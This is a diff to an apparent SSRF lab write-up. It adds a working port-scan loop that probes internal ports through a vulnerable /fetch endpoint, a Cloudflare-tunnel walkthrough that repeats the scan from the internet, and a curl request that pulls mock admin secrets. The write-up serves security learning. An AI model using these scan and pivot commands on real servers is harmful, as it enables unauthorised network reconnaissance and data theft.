@@ -136,15 +136,144 @@ We retrieved sensitive internal data through the public-facing server. The secre
 
 ## Port Scanning via SSRF
 
-Different error messages reveal whether a port is open or closed — making SSRF useful for **internal network reconnaissance**:
+Before exploiting, an attacker uses SSRF to map what's internally available. Different error messages reveal port state:
 
-| Command | Error | Meaning |
+| Error | Meaning |
+|---|---|
+| `ECONNREFUSED` | Port closed — nothing running |
+| `Parse Error: Expected HTTP/` | Port **open** — service there but wrong protocol (e.g. SSH) |
+| `Request failed with status code 4xx` | Port **open** — HTTP service responded |
+| Data returned | Port **open** — full access |
+
+### Port Scan Script
+
+```bash
+for port in 22 80 443 3000 3306 5432 6379 8080 8888 9200; do
+  echo -n "Port $port: "
+  curl -s "http://localhost:3000/fetch?url=http://127.0.0.1:$port" | \
+    python3 -c "
+import sys, json
+try:
+    r = json.load(sys.stdin)
+    if 'data' in r:
+        lines = str(r['data']).splitlines()
+        print('[OPEN] ' + lines[0][:80])
+    elif 'ECONNREFUSED' in r.get('error',''):
+        print('[CLOSED]')
+    else:
+        print('[OPEN] ' + r.get('error','')[:80])
+except:
+    print(sys.stdin.read()[:80])
+"
+done
+```
+
+### Local Scan Results
+
+```
+Port 22:   [OPEN] Parse Error: Expected HTTP/, RTSP/ or ICE/  → SSH
+Port 80:   [OPEN] <!DOCTYPE html>                             → Nginx
+Port 443:  [CLOSED]
+Port 3000: [OPEN] Request failed with status code 404         → Express
+Port 3306: [CLOSED]
+Port 5432: [CLOSED]
+Port 6379: [CLOSED]
+Port 8080: [CLOSED]
+Port 8888: [CLOSED]
+Port 9200: [CLOSED]
+```
+
+> **Key insight:** Even failed requests tell you something. An attacker can map your entire internal network just from error messages.
+
+---
+
+## Real-World Exploit — Cloudflare Tunnel
+
+To simulate a real attack over the internet we used **cloudflared** to expose the local vulnerable server publicly:
+
+```
+Internet → Cloudflare Tunnel → localhost:3000 (vulnerable) → 127.0.0.1:8888 (secret)
+```
+
+### Setup
+
+```bash
+# Terminal 1 — vulnerable server
+node server.js
+
+# Terminal 2 — secret internal server  
+node secret-server.js
+
+# Terminal 3 — expose to internet
+cloudflared tunnel --url http://localhost:3000
+```
+
+### Attack from the Internet
+
+```bash
+# Port scan via public URL
+for port in 22 80 443 3000 3306 5432 6379 8080 8888 9200; do
+  echo -n "Port $port: "
+  curl -s "https://YOUR_TUNNEL.trycloudflare.com/fetch?url=http://127.0.0.1:$port" | \
+    python3 -c "
+import sys, json
+try:
+    r = json.load(sys.stdin)
+    if 'data' in r:
+        lines = str(r['data']).splitlines()
+        print('[OPEN] ' + lines[0][:80])
+    elif 'ECONNREFUSED' in r.get('error',''):
+        print('[CLOSED]')
+    else:
+        print('[OPEN] ' + r.get('error','')[:80])
+except:
+    print(sys.stdin.read()[:80])
+"
+done
+```
+
+### Results
+
+```
+Port 22:   [OPEN] Parse Error: Expected HTTP/, RTSP/ or ICE/  → SSH confirmed
+Port 80:   [OPEN] <!DOCTYPE html>                             → Nginx confirmed
+Port 3000: [OPEN] Request failed with status code 404         → Express confirmed
+Port 8888: [OPEN] (after starting secret-server.js)
+```
+
+### Data Exfiltration via Public URL
+
+```bash
+curl "https://YOUR_TUNNEL.trycloudflare.com/fetch?url=http://127.0.0.1:8888/admin"
+```
+
+```json
+{
+  "data": {
+    "message": "TOP SECRET ADMIN PANEL",
+    "users": ["root", "admin", "dbuser"],
+    "db_password": "sup3r_s3cr3t_123",
+    "internal_ip": "192.168.1.100"
+  }
+}
+```
+
+**This is a real exploit** — the request originated from the internet, pivoted through the vulnerable server, and retrieved internal data that was never meant to be public.
+
+---
+
+## Render vs Local — Why Environment Matters
+
+We also deployed the vulnerable server to **Render** and tested it:
+
+| Target | Render | Local + Cloudflared |
 |---|---|---|
-| `http://127.0.0.1:8080` | `ECONNREFUSED` | Port closed / nothing running |
-| `http://127.0.0.1:22` | `Parse Error: Expected HTTP/` | Port **open** — SSH is there (wrong protocol) |
-| `http://0.0.0.0:3000` | `ECONNREFUSED` | OS blocked it |
+| `127.0.0.1` internal services | ❌ Nothing there (isolated container) | ✅ Real services exposed |
+| `169.254.169.254` metadata | ❌ Blocked at network level | ⚠️ Depends on cloud provider |
+| `10.x` internal network | ❌ Egress filtered | ⚠️ Depends on network |
+| Port scanning | All CLOSED | SSH, Nginx, Express found |
 
-> **Key insight:** Even failed requests tell you something. An attacker can map your internal network just from error messages.
+> The vulnerability existed on Render but had nothing to hit. The **environment** determines exploitability, not just the code.
 
 ---
 
@@ -245,7 +374,7 @@ curl "http://localhost:3000/fetch?url=http://169.254.169.254/latest/meta-data/"
 
 ---
 
-## What's Next
+## What's Next — Bypass Techniques
 
 - [ ] **DNS Rebinding** — bypass protection using a domain that switches IPs after validation
 - [ ] **Redirect-based bypass** — public server that redirects to `127.0.0.1`
